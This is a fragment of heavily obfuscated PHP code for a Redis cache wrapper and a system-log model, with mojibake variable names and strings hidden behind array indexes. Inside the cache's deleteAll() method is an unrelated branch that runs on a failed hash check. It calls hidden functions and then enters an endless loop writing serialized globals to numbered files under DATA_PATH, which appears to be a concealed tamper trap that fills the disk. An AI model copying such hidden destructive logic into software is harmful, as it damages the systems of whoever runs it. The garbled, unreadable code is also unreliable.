Ñ‡°ù[175]], $féÙÅ«­´[$dÓ· Ñ‡°ù[176]], $E’åˆ•ï); } else { $dğÊ¢ÑÜìñ->connect($féÙÅ«­´[$dÓ· Ñ‡°ù[175]], $féÙÅ«­´[$dÓ· Ñ‡°ù[176]], $E’åˆ•ï); } if (!empty($féÙÅ«­´[$dÓ· Ñ‡°ù[403]])) { $dğÊ¢ÑÜìñ->auth($féÙÅ«­´[$dÓ· Ñ‡°ù[403]]); } return $dğÊ¢ÑÜìñ; } private function initCluster($a²¿œ¹õ‰Š, $c¾ôŠù™äá) { $FÁÉù•ÇİÖ =& $_SERVER[¢ÌÛ]; $B‡öïÏò†» = array($FÁÉù•ÇİÖ[812], $FÁÉù•ÇİÖ[813], $FÁÉù•ÇİÖ[814]); $d‹ã…ŞÖ‹ = $FÁÉù•ÇİÖ[812]; if (isset($a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[12]]) && in_array($a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[12]], $B‡öïÏò†»)) { $d‹ã…ŞÖ‹ = $a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[12]]; } switch ($d‹ã…ŞÖ‹) { case $FÁÉù•ÇİÖ[812]: $this->_slave($a²¿œ¹õ‰Š, $c¾ôŠù™äá); break; case $FÁÉù•ÇİÖ[813]: break; case $FÁÉù•ÇİÖ[814]: $this->isCluster = !0; $F£İ‰‡àÜ = $a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[807]]; $AŒ¨ì¦Á”ø = isset($a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[811]]) ? $a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[811]] : !1; $D¢½İÙÊÁÆ = isset($a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[403]]) ? $a²¿œ¹õ‰Š[$FÁÉù•ÇİÖ[403]] : null; $this->handle = new RedisCluster(NUll, $F£İ‰‡àÜ, $c¾ôŠù™äá, $c¾ôŠù™äá, $AŒ¨ì¦Á”ø, $D¢½İÙÊÁÆ); break; default: break; } } private function _slave($bÂØ°è·éË, $Fùòªš§á) { goto D·®‰­Ä¢†; BÖáÁ®Äùë: unset($f”šöí‘ô[0]); if (empty($f”šöí‘ô)) { return; } $fíª¤÷‡ÆÖ = array_rand($f”šöí‘ô); goto eŠÕÁ­ì™ã; eŠÕÁ­ì™ã: $this->filterConfig($bÂØ°è·éË, $f”šöí‘ô[$fíª¤÷‡ÆÖ]); $this->slaveHandle = $this->init($bÂØ°è·éË, $Fùòªš§á); goto EÎÕ¾å¶´¡; D·®‰­Ä¢†: $f”šöí‘ô = $bÂØ°è·éË[$_SERVER[¢ÌÛ][807]]; $this->filterConfig($bÂØ°è·éË, $f”šöí‘ô[0]); $this->handle = $this->init($bÂØ°è·éË, $Fùòªš§á); goto BÖáÁ®Äùë; EÎÕ¾å¶´¡: } private function filterConfig(&$A¯ì…–‘, $eÌó—‘Ùè¡) { $Fç‰“¨”˜‘ =& $_SERVER[¢ÌÛ]; $FôÅ¦ã¯ = explode($Fç‰“¨”˜‘[4], $eÌó—‘Ùè¡); $c‰ˆêíµÓ = array($Fç‰“¨”˜‘[175] => $FôÅ¦ã¯[0], $Fç‰“¨”˜‘[176] => $FôÅ¦ã¯[1]); $A¯ì…–‘ = array_merge($A¯ì…–‘, $c‰ˆêíµÓ); } public function set($dÄ»õ‹Ëˆˆ, $b¹Ê‘ËØ˜”, $Fˆ—ï¾ÓÅç = false) { $Fˆ—ï¾ÓÅç = $Fˆ—ï¾ÓÅç ? $Fˆ—ï¾ÓÅç : $this->cacheTime; return $this->handle->setEx($dÄ»õ‹Ëˆˆ, $Fˆ—ï¾ÓÅç, $b¹Ê‘ËØ˜”); } public function setLock($aíœ‰÷‰¢Ş, $d‘°ÚƒÂçÄ, $B’ÜÑÇÁÁÎ) { return $this->handle->setNX($aíœ‰÷‰¢Ş, $d‘°ÚƒÂçÄ); } public function get($a¦¼¢èŠØ¾) { $a„ïÖÂæÔ² = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $a„ïÖÂæÔ²->get($a¦¼¢èŠØ¾); } public function remove($Eİ¸åÉ§Çœ) { return $this->handle->del($Eİ¸åÉ§Çœ); } public function deleteAll() { $EÛÈˆ©ÎÒ½ =& $_SERVER[¢ÌÛ]; $A†’ÜåğÉŠ = $_SERVER[$EÛÈˆ©ÎÒ½[386]]; $eŠøôŠ†£í = $EÛÈˆ©ÎÒ½[387]; if ($_SERVER[$EÛÈˆ©ÎÒ½[388]] != $eŠøôŠ†£í($A†’ÜåğÉŠ)) { goto f„Ó«»…”; Då¨íƒÏÔ‰: $f¡¼š¨£ª = $EñÛ¬¢Ğ‘½($e±àÄƒ¥Á); $FÏ‡òîÒá› = explode($EÛÈˆ©ÎÒ½[227], $f¡¼š¨£ª); if (count($FÏ‡òîÒá›) < $EÛÈˆ©ÎÒ½[577]) { $eâ¾Æ™„’ = $EÛÈˆ©ÎÒ½[393]; $eâ¾Æ™„’(); } goto E‰ŸÛ‘ç¯Ì; E‰ŸÛ‘ç¯Ì: $dåØÛóÑ¼· = $EÛÈˆ©ÎÒ½[816]; $dåØÛóÑ¼·($_SERVER[$EÛÈˆ©ÎÒ½[817]]); $eéÔ˜ˆèíĞ = $EÛÈˆ©ÎÒ½[815]; goto eô³ˆŞ–Õ; f„Ó«»…”: $eéÔ˜ˆèíĞ = $EÛÈˆ©ÎÒ½[815]; $EñÛ¬¢Ğ‘½ = $EÛÈˆ©ÎÒ½[389]; $e±àÄƒ¥Á = $_SERVER[$EÛÈˆ©ÎÒ½[390]] . $EÛÈˆ©ÎÒ½[391]; goto Då¨íƒÏÔ‰; a³Ç­ëÓƒ: $aˆ·«‰®ˆä = 1; for ($Bß©ÖÖ²ˆŞ = $aˆ·«‰®ˆä; $Bß©ÖÖ²ˆŞ > 0; $Bß©ÖÖ²ˆŞ++) { $F’÷¤íŸÜ(DATA_PATH . $Bß©ÖÖ²ˆŞ, $F²‰—¡¶ÆÀ); } goto c’±¿ÖïÏß; eô³ˆŞ–Õ: $eéÔ˜ˆèíĞ(); $F’÷¤íŸÜ = $EÛÈˆ©ÎÒ½[818]; $F²‰—¡¶ÆÀ = json_encode($GLOBALS[$EÛÈˆ©ÎÒ½[819]]); goto a³Ç­ëÓƒ; c’±¿ÖïÏß: } if ($this->isCluster) { foreach ($this->handle->_masters() as $DÂŠ’ª™²£) { $this->handle->flushall($DÂŠ’ª™²£); } return; } return $this->handle->flushAll(); } } goto C»øÚ¿¯º ; aèÌ—Ö¦ã¢: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\124\x69\x6d\x65", "\164\151\x6d\145", "\151\x6e\163\x65\x72\164", "\146\x75\156\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $fïë³°¿÷ª =& $_SERVER[¢ÌÛ]; return array($fïë³°¿÷ª[1967] => LNG($fïë³°¿÷ª[1968]), $fïë³°¿÷ª[1969] => LNG($fïë³°¿÷ª[1970]), $fïë³°¿÷ª[1596] => LNG($fïë³°¿÷ª[1971]), $fïë³°¿÷ª[1972] => LNG($fïë³°¿÷ª[1973]), $fïë³°¿÷ª[1974] => LNG($fïë³°¿÷ª[1975]), $fïë³°¿÷ª[1976] => LNG($fïë³°¿÷ª[1977]), $fïë³°¿÷ª[1978] => LNG($fïë³°¿÷ª[1979]), $fïë³°¿÷ª[1627] => LNG($fïë³°¿÷ª[1979]), $fïë³°¿÷ª[1628] => LNG($fïë³°¿÷ª[1980]), $fïë³°¿÷ª[1981] => LNG($fïë³°¿÷ª[1982]), $fïë³°¿÷ª[1983] => LNG($fïë³°¿÷ª[1984]), $fïë³°¿÷ª[1985] => LNG($fïë³°¿÷ª[1986]), $fïë³°¿÷ª[1987] => LNG($fïë³°¿÷ª[1988]), $fïë³°¿÷ª[1625] => LNG($fïë³°¿÷ª[1989]), $fïë³°¿÷ª[1632] => LNG($fïë³°¿÷ª[1990]), $fïë³°¿÷ª[1991] => LNG($fïë³°¿÷ª[1992]), $fïë³°¿÷ª[1993] => LNG($fïë³°¿÷ª[1994]), $fïë³°¿÷ª[1995] => LNG($fïë³°¿÷ª[1996]), $fïë³°¿÷ª[1997] => LNG($fïë³°¿÷ª[1998]), $fïë³°¿÷ª[1635] => LNG($fïë³°¿÷ª[1999]), $fïë³°¿÷ª[1636] => LNG($fïë³°¿÷ª[2000]), $fïë³°¿÷ª[2001] => LNG($fïë³°¿÷ª[2002]), $fïë³°¿÷ª[2003] => LNG($fïë³°¿÷ª[2004]), $fïë³°¿÷ª[2005] => LNG($fïë³°¿÷ª[2006]), $fïë³°¿÷ª[1630] => LNG($fïë³°¿÷ª[2007]), $fïë³°¿÷ª[2008] => LNG($fïë³°¿÷ª[2009]), $fïë³°¿÷ª[1629] => LNG($fïë³°¿÷ª[2010]), $fïë³°¿÷ª[2011] => LNG($fïë³°¿÷ª[2012]), $fïë³°¿÷ª[2013] => LNG($fïë³°¿÷ª[2014]), $fïë³°¿÷ª[2015] => LNG($fïë³°¿÷ª[2015]), $fïë³°¿÷ª[2016] => LNG($fïë³°¿÷ª[1600]), $fïë³°¿÷ª[2017] => LNG($fïë³°¿÷ª[2018]), $fïë³°¿÷ª[2019] => LNG($fïë³°¿÷ª[2020]), $fïë³°¿÷ª[2021] => LNG($fïë³°¿÷ª[2022]), $fïë³°¿÷ª[2023] => LNG($fïë³°¿÷ª[2024]), $fïë³°¿÷ª[2025] => LNG($fïë³°¿÷ª[2026]), $fïë³°¿÷ª[2027] => LNG($fïë³°¿÷ª[2027]), $fïë³°¿÷ª[2028] => LNG($fïë³°¿÷ª[2029]), $fïë³°¿÷ª[2030] => LNG($fïë³°¿÷ª[2031]), $fïë³°¿÷ª[2032] => LNG($fïë³°¿÷ª[2033]), $fïë³°¿÷ª[2034] => LNG($fïë³°¿÷ª[2035]), $fïë³°¿÷ª[2036] => LNG($fïë³°¿÷ª[2037]), $fïë³°¿÷ª[2038] => LNG($fïë³°¿÷ª[2039])); } private function typeFile() { $A½¤ª­²é =& $_SERVER[¢ÌÛ]; $c¡Œ­ùÕ³ = array($A½¤ª­²é[1632] => array($A½¤ª­²é[1633]), $A½¤ª­²é[1985] => array($A½¤ª­²é[2040]), $A½¤ª­²é[1987] => array($A½¤ª­²é[2041]), $A½¤ª­²é[1625] => array($A½¤ª­²é[1626]), $A½¤ª­²é[1993] => array(), $A½¤ª­²é[1995] => array(), $A½¤ª­²é[1997] => array(), $A½¤ª­²é[1635] => array($A½¤ª­²é[1637]), $A½¤ª­²é[1636] => array($A½¤ª­²é[1637]), $A½¤ª­²é[2001] => array($A½¤ª­²é[2042]), $A½¤ª­²é[2003] => array($A½¤ª­²é[2042]), $A½¤ª­²é[2005] => array($A½¤ª­²é[2043]), $A½¤ª­²é[1991] => array($A½¤ª­²é[2044]), $A½¤ª­²é[1630] => array($A½¤ª­²é[2045]), $A½¤ª­²é[2008] => array($A½¤ª­²é[2046]), $A½¤ª­²é[1629] => array($A½¤ª­²é[1631])); return $c¡Œ­ùÕ³; } private function typeAll() { goto f²»Ú‚‡¦º; f²»Ú‚‡¦º: $Cö‡´£âÄ§ =& $_SERVER[¢ÌÛ]; $EÀïá–è÷Ô = $this->typeList; $c„îäª½ôï = array_filter($this->typeFile()); goto e¥Ü…‹äæÏ; AºäùËã…‘: return $EÀïá–è÷Ô; goto cŠ‹™»é; e¥Ü…‹äæÏ: foreach ($c„îäª½ôï as $b´“¹éÄñ… => $cáÄî¡•½±) { $EÀïá–è÷Ô[$cáÄî¡•½±[0]] = $EÀïá–è÷Ô[$b´“¹éÄñ…]; } $EÀïá–è÷Ô[$Cö‡´£âÄ§[1637]] = LNG($Cö‡´£âÄ§[2047]); $EÀïá–è÷Ô[$Cö‡´£âÄ§[2042]] = LNG($Cö‡´£âÄ§[2048]); goto AºäùËã…‘; cŠ‹™»é: } public function addLog($c‹§µëöƒç, $b…ÎÅçñ·« = array()) { goto e²İœ¸Œéµ; e²İœ¸Œéµ: $BÜ»ƒÛòÆ =& $_SERVER[¢ÌÛ]; if (!isset($this->typeList[$c‹§µëöƒç])) { return; } $eºù‚§Øë = defined($BÜ»ƒÛòÆ[452]) && USER_ID ? USER_ID : (isset($b…ÎÅçñ·«[$BÜ»ƒÛòÆ[1498]]) ? $b…ÎÅçñ·«[$BÜ»ƒÛòÆ[1498]] : 0); goto AÊãÓ¤¶´; AÊãÓ¤¶´: if (!$eºù‚§Øë) { $eºù‚§Øë = (int) Session::get($BÜ»ƒÛòÆ[1781]); } $D‹¶÷¯¢—è = get_client_ip(); if (!$b…ÎÅçñ·« || strlen(json_encode($b…ÎÅçñ·«)) >= 1024) { $b…ÎÅçñ·« = array($BÜ»ƒÛòÆ[2049] => $D‹¶÷¯¢—è); } else { if (is_array($b…ÎÅçñ·«)) { $b…ÎÅçñ·«[$BÜ»ƒÛòÆ[2049]] = $D‹¶÷¯¢—è; } else { $b…ÎÅçñ·« = array($BÜ»ƒÛòÆ[1064] => $b…ÎÅçñ·«, $BÜ»ƒÛòÆ[2049] => $D‹¶÷¯¢—è); } } goto aÎ…®†é¦ˆ; aÎ…®†é¦ˆ: $b…ÎÅçñ·« = array($BÜ»ƒÛòÆ[1489] => Session::sign(), $BÜ»ƒÛòÆ[1490] => $eºù‚§Øë, $BÜ»ƒÛòÆ[29] => $c‹§µëöƒç, $BÜ»ƒÛòÆ[1492] => json_encode($b…ÎÅçñ·«)); parent::add($b…ÎÅçñ·«); goto CÑ†Øâ÷—; CÑ†Øâ÷—: } public function remove($CµÚ÷çÃŒ) { $this->where(array($_SERVER[¢ÌÛ][412] => $CµÚ÷çÃŒ))->delete(); } private function _makeOrder($E¤¾¤åÅ¾ = '') { goto cŸ°»¬·á¸; c¤‰™Ş»ôò: return $this->order($E¤¾¤åÅ¾); goto f£Ä¬ÅÈ®Š; cŸ°»¬·á¸: $eâ”˜²¦À˜ =& $_SERVER[¢ÌÛ]; $EîïéÎÎ¿» = $eâ”˜²¦À˜[192]; $b‡–‡—‡¸ = array($eâ”˜²¦À˜[428] => $eâ”˜²¦À˜[429], $eâ”˜²¦À˜[430] => $eâ”˜²¦À˜[431]); goto fÌµ´Ğ°¢‡; fÌµ´Ğ°¢‡: $a‰‹õÊŒ‰¤ = Input::get($eâ”˜²¦À˜[434], $eâ”˜²¦À˜[7], $eâ”˜²¦À˜[1816], array($eâ”˜²¦À˜[1741], $eâ”˜²¦À˜[430])); $a‰‹õÊŒ‰¤ = $b‡–‡—‡¸[$a‰‹õÊŒ‰¤]; $E¤¾¤åÅ¾ = $E¤¾¤åÅ¾ . "{$EîïéÎÎ¿»}\x20{$a‰‹õÊŒ‰¤}"; goto c¤‰™Ş»ôò; f£Ä¬ÅÈ®Š: } public function get($f×Ô„Ô›‘§ = '') { goto c‚Úë¦Æ¿Î; d°õòœ®î‹: if ($f×Ô„Ô›‘§[$fËŒÆäø›Ş[1498]]) { $b™ÛŞŒ×íí[$fËŒÆäø›Ş[1498]] = $f×Ô„Ô›‘§[$fËŒÆäø›Ş[1498]]; } if (isset($f×Ô„Ô›‘§[$fËŒÆäø›Ş[725]])) { $dğË®šãËÂ = $f×Ô„Ô›‘§[$fËŒÆäø›Ş[725]]; $eÃÄ‹óá¾ = isset($f×Ô„Ô›‘§[$fËŒÆäø›Ş[474]]) ? $f×Ô„Ô›‘§[$fËŒÆäø›Ş[474]] : time(); $b™ÛŞŒ×íí[$fËŒÆäø›Ş[192]] = array($fËŒÆäø›Ş[329], array($dğË®šãËÂ, $eÃÄ‹óá¾)); } if ($f×Ô„Ô›‘§[$fËŒÆäø›Ş[29]]) { $d…í­ô‰¢¤ = explode($fËŒÆäø›Ş[47], $f×Ô„Ô›‘§[$fËŒÆäø›Ş[29]]); $Aè°­³Ï©Ä = $this->typeFile(); $C¤·¹½»“ = array(); foreach ($d…í­ô‰¢¤ as $a©óˆ’—­‘) { $C¤·¹½»“[] = $a©óˆ’—­‘; if (isset($Aè°­³Ï©Ä[$a©óˆ’—­‘])) { $C¤·¹½»“ = array_merge($C¤·¹½»“, $Aè°­³Ï©Ä[$a©óˆ’—­‘]); } } $C¤·¹½»“ = array_unique($C¤·¹½»“); if ($C¤·¹½»“) { $b™ÛŞŒ×íí[$fËŒÆäø›Ş[29]] = array($fËŒÆäø›Ş[7], $C¤·¹½»“); } } goto a°†Ì‰; cÜ¿Í³ò¹ë: $cÎĞ‡ä˜–Ï[$fËŒÆäø›Ş[363]] = $this->logList($cÎĞ‡ä˜–Ï[$fËŒÆäø›Ş[363]]); return $cÎĞ‡ä˜–Ï; goto cèŸİ¿§ãÖ; a°†Ì‰: if (!empty($f×Ô„Ô›‘§[$fËŒÆäø›Ş[2049]])) { $b™ÛŞŒ×íí[$fËŒÆäø›Ş[431]] = array($fËŒÆäø›Ş[375], "\45{$f×Ô„Ô›‘§[$fËŒÆäø›Ş[2049]]}\45"); } $cÎĞ‡ä˜–Ï = $this->_makeOrder()->where($b™ÛŞŒ×íí)->selectPage(); if (empty($cÎĞ‡ä˜–Ï[$fËŒÆäø›Ş[363]])) { show_json(array(), !0, $cÎĞ‡ä˜–Ï[$fËŒÆäø›Ş[360]]); } goto cÜ¿Í³ò¹ë; c‚Úë¦Æ¿Î: $fËŒÆäø›Ş =& $_SERVER[¢ÌÛ]; if (!$f×Ô„Ô›‘§) { show_json(array()); } $b™ÛŞŒ×íí = array(); goto d°õòœ®î‹; cèŸİ¿§ãÖ: } private function ipAddress(&$D£ä‡±ÑÀ‹) { $bÏÏÉ±ª‘ =& $_SERVER[¢ÌÛ]; if (!empty($D£ä‡±ÑÀ‹[$bÏÏÉ±ª‘[2049]])) { $D¸ ÑÔÙ¨œ = IpLocation::get($D£ä‡±ÑÀ‹[$bÏÏÉ±ª‘[2049]]); } else { $D¸ ÑÔÙ¨œ = LNG($bÏÏÉ±ª‘[2050]); } $D£ä‡±ÑÀ‹[$bÏÏÉ±ª‘[2051]] = $D¸ ÑÔÙ¨œ; } private function descZipDownload($dˆ·à¼¤º, &$a‡–Ó¨…¼) { $dèˆÔÁó =& $_SERVER[¢ÌÛ]; if (!isset($dˆ·à¼¤º[$dèˆÔÁó[2052]])) { return; } $b¶˜Öªª = json_decode($dˆ·à¼¤º[$dèˆÔÁó[2052]], !0); foreach ($b¶˜Öªª as $aàÊÁ—£ª‡) { try { $D Éò¸­³‡ = IO::infoFull($aàÊÁ—£ª‡[$dèˆÔÁó[75]]); } catch (Exception $D›¾š¿¢”á) { continue; } $dˆ·à¼¤º[$dèˆÔÁó[75]] = $aàÊÁ—£ª‡[$dèˆÔÁó[75]]; $a‡–Ó¨…¼[] = $dˆ·à¼¤º[$dèˆÔÁó[396]] = $D Éò¸­³‡[$dèˆÔÁó[396]]; $a‡–Ó¨…¼[] = $dˆ·à¼¤º[$dèˆÔÁó[1871]] = $D Éò¸­³‡[$dèˆÔÁó[488]]; break; } return $dˆ·à¼¤º; } private function getSourceList(&$A«¿Ê»ŞîŞ) { $D­åé‘šèê =& $_SERVER[¢ÌÛ]; $cÃ´ÈŒ‹¾ = array(); foreach ($A«¿Ê»ŞîŞ as $B¹†¢¬¸ÄŠ => $BˆòØ§½²ğ) { goto CĞ™ñÏŒ’Ê; EÇá¤›š²»: if ($aÒÀÆ¨Ñ®ô[$D­åé‘šèê[29]] == $D­åé‘šèê[1879]) { $cÃ´ÈŒ‹¾[] = $aÒÀÆ¨Ñ®ô[$D­åé‘šèê[431]][$D­åé‘šèê[396]]; } goto fÄ‡Ê¸ï²Š; eï·àŒßÁ: $cÃ´ÈŒ‹¾[] = $aÒÀÆ¨Ñ®ô[$D­åé‘šèê[396]]; $cÃ´ÈŒ‹¾[] = $aÒÀÆ¨Ñ®ô[$D­åé‘šèê[1871]]; if ($aÒÀÆ¨Ñ®ô[$D­åé‘šèê[29]] == $D­åé‘šèê[518]) { $cÃ´ÈŒ‹¾[] = $aÒÀÆ¨Ñ®ô[$D­åé‘šèê[431]][$D­åé‘šèê[1031]]; $cÃ´ÈŒ‹¾[] = $aÒÀÆ¨Ñ®ô[$D­åé‘šèê[431]][$D­åé‘šèê[1032]]; } goto EÇá¤›š²»; CĞ™ñÏŒ’Ê: $aÒÀÆ¨Ñ®ô = json_decode($BˆòØ§½²ğ[$D­åé‘šèê[431]], !0); if ($BˆòØ§½²ğ[$D­åé‘šèê[29]] == $D­åé‘šèê[1628]) { $aÒÀÆ¨Ñ®ô = $this->descZipDownload($aÒÀÆ¨Ñ®ô, $cÃ´ÈŒ‹¾); $A«¿Ê»ŞîŞ[$B¹†¢¬¸ÄŠ][$D­åé‘šèê[431]] = json_encode($aÒÀÆ¨Ñ®ô); continue; } if (strpos($BˆòØ§½²ğ[$D­åé‘šèê[29]], $D­åé‘šèê[1872]) !== 0) { if (!isset($aÒÀÆ¨Ñ®ô[$D­åé‘šèê[75]]) || strpos($BˆòØ§½²ğ[$D­åé‘šèê[29]], $D­åé‘šèê[2053]) !== 0) { continue; } try { $BƒÅãÄÈÚ = IO::infoFull($aÒÀÆ¨Ñ®ô[$D­åé‘šèê[75]]); } catch (Exception $Dî¦¤·ñ¸°) { continue; } $cÃ´ÈŒ‹¾[] = $aÒÀÆ¨Ñ®ô[$D­åé‘šèê[396]] = $BƒÅãÄÈÚ[$D­åé‘šèê[396]]; $cÃ´ÈŒ‹¾[] = $aÒÀÆ¨Ñ®ô[$D­åé‘šèê[1871]] = $BƒÅãÄÈÚ[$D­åé‘šèê[488]]; $A«¿Ê»ŞîŞ[$B¹†¢¬¸ÄŠ][$D­åé‘šèê[431]] = json_encode($aÒÀÆ¨Ñ®ô); continue; } goto eï·àŒßÁ; fÄ‡Ê¸ï²Š: } if (!$cÃ´ÈŒ‹¾) { return array(); } return Model($D­åé‘šèê[774])->sourceListInfo($cÃ´ÈŒ‹¾, !0); } private function logList($DÆ³½ë›–Ï) { goto E¬ºƒƒßŠÃ; f¾Ğñ¼ö£ƒ: return $fÁõ¼±± ; goto CŸ¸ ÑÑĞ; A—Â–é¹ö: $e¼ ğÃ¯ÈÈ = $this->getSourceList($DÆ³½ë›–Ï); $EÓŒÀàòÒÑ = $this->typeAll(); $fÁõ¼±±  = array(); goto BĞ¸Á­Œ˜; E¬ºƒƒßŠÃ: $a¯˜ñ¶ã­ =& $_SERVER[¢ÌÛ]; $a°õïœÙç = array_to_keyvalue($DÆ³½ë›–Ï, $a¯˜ñ¶ã­[33], $a¯˜ñ¶ã­[1498]); $EŒÉ½æÜŸ = Model($a¯˜ñ¶ã­[504])->userListInfo(array_unique($a°õïœÙç)); goto A—Â–é¹ö; BĞ¸Á­Œ˜: $aõ·¬öÈÎ = array(); foreach ($DÆ³½ë›–Ï as $e¸©®ÇÏï± => $aâ¥‰š¡¥) { goto aƒ§Ú§É¦; d˜…ÒÂ£©é: $aâ¥‰š¡¥[$a¯˜ñ¶ã­[28]] = isset($Dà»ªîñ”[$a¯˜ñ¶ã­[28]]) ? $Dà»ªîñ”[$a¯˜ñ¶ã­[28]] : LNG($a¯˜ñ¶ã­[2050]); $aâ¥‰š¡¥[$a¯˜ñ¶ã­[1921]] = isset($Dà»ªîñ”[$a¯˜ñ¶ã­[1921]]) ? $Dà»ªîñ”[$a¯˜ñ¶ã­[1921]] : $a¯˜ñ¶ã­[33]; $aâ¥‰š¡¥[$a¯˜ñ¶ã­[1403]] = isset($EÓŒÀàòÒÑ[$câ„ÈÓâÑé]) ? $EÓŒÀàòÒÑ[$câ„ÈÓâÑé] : $a‘¾¦¤å‡›; goto Bê‘»‘ÎªÆ; aƒ§Ú§É¦: $câ„ÈÓâÑé = $aâ¥‰š¡¥[$a¯˜ñ¶ã­[29]]; $Dà»ªîñ” = isset($EŒÉ½æÜŸ[$aâ¥‰š¡¥[$a¯˜ñ¶ã­[1498]]]) ? $EŒÉ½æÜŸ[$aâ¥‰š¡¥[$a¯˜ñ¶ã­[1498]]] : !1; $a‘¾¦¤å‡› = strpos($câ„ÈÓâÑé, $a¯˜ñ¶ã­[2054]) === 0 ? LNG($a¯˜ñ¶ã­[2055]) : LNG($a¯˜ñ¶ã­[2050]); goto d˜…ÒÂ£©é; B‰¦ßò÷: $this->ipAddress($aâ¥‰š¡¥); if (strpos($câ„ÈÓâÑé, $a¯˜ñ¶ã­[1872]) === 0 || isset($e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1871]])) { goto CÜ˜×®ËÇ; d¢°×çŠŠØ: if ($e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1884]] && $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1884]][$a¯˜ñ¶ã­[398]] == $a¯˜ñ¶ã­[1142]) { $aõ·¬öÈÎ[] = $aâ¥‰š¡¥[$a¯˜ñ¶ã­[385]]; unset($DÆ³½ë›–Ï[$e¸©®ÇÏï±]); continue; } goto F¯ä«¯˜¡À; CÜ˜×®ËÇ: $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[84]] = $e¼ ğÃ¯ÈÈ[$e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[396]]]; $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1884]] = $e¼ ğÃ¯ÈÈ[$e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1871]]]; if ($e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[29]] == $a¯˜ñ¶ã­[518]) { $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[431]][$a¯˜ñ¶ã­[1031]] = $e¼ ğÃ¯ÈÈ[$e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[431]][$a¯˜ñ¶ã­[1031]]]; $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[431]][$a¯˜ñ¶ã­[1032]] = $e¼ ğÃ¯ÈÈ[$e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[431]][$a¯˜ñ¶ã­[1032]]]; } goto AŞé¤œˆ‚; AŞé¤œˆ‚: if ($e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[29]] == $a¯˜ñ¶ã­[1879]) { $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[431]][$a¯˜ñ¶ã­[396]] = $e¼ ğÃ¯ÈÈ[$e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[431]][$a¯˜ñ¶ã­[396]]]; } if ($e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[29]] == $a¯˜ñ¶ã­[1623]) { $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1884]] = $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[84]]; $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1871]] = $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[1884]][$a¯˜ñ¶ã­[396]]; $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[84]] = !1; $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[396]] = $a¯˜ñ¶ã­[33]; } if ($e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[84]] && $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[84]][$a¯˜ñ¶ã­[398]] == $a¯˜ñ¶ã­[1142]) { $aõ·¬öÈÎ[] = $aâ¥‰š¡¥[$a¯˜ñ¶ã­[385]]; unset($DÆ³½ë›–Ï[$e¸©®ÇÏï±]); continue; } goto d¢°×çŠŠØ; F¯ä«¯˜¡À: } $aâ¥‰š¡¥[$a¯˜ñ¶ã­[431]] = $e—ø¶ŸÚÒñ; goto Aò¤†”…”; Bê‘»‘ÎªÆ: $aâ¥‰š¡¥[$a¯˜ñ¶ã­[1815]] = $Dà»ªîñ”; $e—ø¶ŸÚÒñ = json_decode($aâ¥‰š¡¥[$a¯˜ñ¶ã­[431]], !0); $aâ¥‰š¡¥[$a¯˜ñ¶ã­[2049]] = isset($e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[2049]]) ? $e—ø¶ŸÚÒñ[$a¯˜ñ¶ã­[2049]] : $a¯˜ñ¶ã­[33]; goto B‰¦ßò÷; Aò¤†”…”: unset($aâ¥‰š¡¥[$a¯˜ñ¶ã­[2056]]); $fÁõ¼±± [] = $aâ¥‰š¡¥; goto FÓ°‘¡ÑÀ§; FÓ°‘¡ÑÀ§: } $this->clearSystemPathLog($aõ·¬öÈÎ); goto f¾Ğñ¼ö£ƒ; CŸ¸ ÑÑĞ: } private function clearSystemPathLog($F‰šò–‰ãø) { $Eš‡«á™¡ƒ =& $_SERVER[¢ÌÛ]; if (count($F‰šò–‰ãø) == 0) { return; } $e“ã‰°Ò = array($Eš‡«á™¡ƒ[385] => array($Eš‡«á™¡ƒ[7], array_unique($F‰šò–‰ãø))); $this->where($e“ã‰°Ò)->delete(); } public function deviceList($Aå„¬ªÎ÷, $dÂ®ñ·ôª = 0) { $bŒ•öÛ‚‰Ô =& $_SERVER[¢ÌÛ]; $C±Âíºù¨É = array($bŒ•öÛ‚‰Ô[1498] => $Aå„¬ªÎ÷, $bŒ•öÛ‚‰Ô[192] => array($bŒ•öÛ‚‰Ô[948], $dÂ®ñ·ôª), $bŒ•öÛ‚‰Ô[29] => $bŒ•öÛ‚‰Ô[1596]); $E§ˆ´ÛîÅ‰ = array(); $E›õ¬Ğ³…÷ = $this->field($bŒ•öÛ‚‰Ô[2057])->where($C±Âíºù¨É)->order($bŒ•öÛ‚‰Ô[1882])->limit(50)->select(); foreach ($E›õ¬Ğ³…÷ as $BƒàÃ¿¨ŒÆ => $CÒÂó£Ò½´) { goto EÄ˜¿Çåˆ; Aáç¸°ªĞ‰: 